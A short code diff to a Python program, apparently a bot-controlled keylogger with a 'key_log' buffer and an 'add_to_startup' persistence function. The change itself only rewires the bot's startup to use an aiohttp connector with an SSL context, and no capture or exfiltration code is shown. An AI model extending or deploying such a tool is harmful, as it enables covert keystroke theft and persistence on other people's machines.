@@ -21,6 +21,7 @@ from os import getenv
 import glob
 import ssl
 import certifi
+import aiohttp
 
 key_log = []
 log_active = False
@@ -846,4 +847,10 @@ def add_to_startup():
 ssl_context = ssl.create_default_context()
 ssl_context.load_verify_locations(certifi.where())
 
-bot.run(TOKEN, ssl=ssl_context)
+async def start_bot():
+    async with aiohttp.ClientSession() as session:
+        async with bot:
+            bot.http.connector = aiohttp.TCPConnector(ssl=ssl_context)
+            await bot.start(TOKEN)
+
+asyncio.run(start_bot())
